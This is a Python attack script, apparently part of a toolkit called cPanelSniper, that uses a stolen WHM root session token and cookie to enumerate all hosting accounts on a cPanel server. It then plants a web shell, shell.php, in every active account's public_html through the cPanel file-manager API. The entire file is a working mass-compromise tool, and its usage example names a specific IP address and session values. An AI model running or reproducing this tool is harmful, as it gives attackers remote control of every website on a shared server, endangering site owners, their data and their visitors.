#!/usr/bin/env python3
"""
Upload shell.php to all active WHM domains via root access
Usage: python3 upload_shell.py <WHM_URL> <SESSION_TOKEN> <COOKIE>
"""

import sys
import requests
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WHMShellUploader:
    def __init__(self, whm_url, session_token, cookie):
        self.whm_url = whm_url.rstrip('/')
        self.session_token = session_token
        self.cookie = cookie
        self.headers = {
            'Cookie': f'whostmgrsession={cookie}',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.session.verify = False

    def api_request(self, endpoint, params=None, data=None):
        """Make WHM API request"""
        url = f"{self.whm_url}{self.session_token}{endpoint}"
        response = self.session.post(url, params=params, data=data, timeout=30)
        response.raise_for_status()
        return response.json()

    def list_accounts(self):
        """List all accounts in WHM"""
        try:
            result = self.api_request('/json-api/listaccts', {'api.version': 1})
            if result.get('metadata', {}).get('result'):
                accounts = result.get('data', {}).get('acct', [])
                return accounts
            return []
        except Exception as e:
            print(f"Error listing accounts: {e}")
            return []

    def get_account_domains(self, account):
        """Get all domains for an account"""
        domains = []

        # Main domain
        if account.get('domain'):
            domains.append(account['domain'])

        # Addon domains
        if account.get('maxaddons', 0) > 0:
            try:
                # Get addon domains via domainuserdata
                user = account.get('user')
                if user:
                    result = self.api_request(
                        '/json-api/getdomainuserdata',
                        {'api.version': 1, 'domain': account['domain']}
                    )
                    if result.get('data'):
                        userdata = result['data']
                        # Check for addon domains in userdata
                        # This is a simplified approach
                        pass
            except:
                pass

        return domains

    def upload_shell_to_account(self, account, shell_content):
        """Upload shell.php to account's public_html"""
        user = account.get('user')
        domain = account.get('domain')

        if not user or not domain:
            print(f"  ⚠️  Skipping invalid account: {account}")
            return False

        try:
            # Get user's home directory
            homedir = account.get('homedir', f'/home/{user}')
            target_path = f"{homedir}/public_html/shell.php"

            # Upload file using cPanel API
            # First, try to write via file manager API
            api_url = f"{self.whm_url}{self.session_token}/json-api/cpanel"

            # Method 1: Use cpanel API to write file
            data = {
                'cpanel_jsonapi_user': user,
                'cpanel_jsonapi_module': 'Fileman',
                'cpanel_jsonapi_func': 'savefile',
                'cpanel_jsonapi_apiversion': '3',
                'dir': '/public_html',
                'file': 'shell.php',
                'content': shell_content
            }

            response = self.session.post(api_url, data=data, timeout=30)

            if response.status_code == 200:
                result = response.json()
                if result.get('cpanelresult', {}).get('data', [{}])[0].get('result'):
                    print(f"  ✅ Uploaded to {domain} ({user})")
                    print(f"     → https://{domain}/shell.php")
                    return True

            # Method 2: Use FTP upload via shell (if available)
            # This would require FTP credentials

            print(f"  ❌ Failed to upload to {domain} ({user})")
            return False

        except Exception as e:
            print(f"  ❌ Error uploading to {domain} ({user}): {e}")
            return False

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 upload_shell.py <WHM_URL> <SESSION_TOKEN> <COOKIE>")
        print("")
        print("Example:")
        print("  python3 upload_shell.py https://5.9.241.37:2087 /cpsess2231081202 %3ARpRCEB84DQNWOqju")
        sys.exit(1)

    whm_url = sys.argv[1]
    session_token = sys.argv[2]
    cookie = sys.argv[3] if len(sys.argv) > 3 else ''

    print("=" * 60)
    print("WHM Shell Uploader")
    print("=" * 60)
    print(f"Target: {whm_url}")
    print(f"Session: {session_token}")
    print("")

    # Read shell.php content
    shell_path = '/root/cPanelSniper/shell.php'
    try:
        with open(shell_path, 'r') as f:
            shell_content = f.read()
        print(f"✓ Shell file loaded: {shell_path} ({len(shell_content)} bytes)")
    except FileNotFoundError:
        print(f"❌ Shell file not found: {shell_path}")
        sys.exit(1)

    # Initialize uploader
    uploader = WHMShellUploader(whm_url, session_token, cookie)

    # List accounts
    print("\n[1/2] Listing accounts...")
    accounts = uploader.list_accounts()
    print(f"✓ Found {len(accounts)} accounts")

    if not accounts:
        print("❌ No accounts found")
        sys.exit(1)

    # Show accounts
    print("\nAccounts:")
    for i, acc in enumerate(accounts, 1):
        status = "✓ Active" if acc.get('suspended') == 0 else "✗ Suspended"
        print(f"  {i}. {acc.get('domain')} ({acc.get('user')}) - {status}")

    # Upload shell
    print("\n[2/2] Uploading shell.php...")
    print("")

    success_count = 0
    for i, account in enumerate(accounts, 1):
        # Skip suspended accounts
        if account.get('suspended', 0) == 1:
            print(f"  ⏭️  Skipping suspended: {account.get('domain')}")
            continue

        print(f"{i}/{len(accounts)}: {account.get('domain')} ({account.get('user')})")

        if uploader.upload_shell_to_account(account, shell_content):
            success_count += 1

    print("")
    print("=" * 60)
    print(f"Upload Complete: {success_count}/{len(accounts)} successful")
    print("=" * 60)

if __name__ == '__main__':
    main()
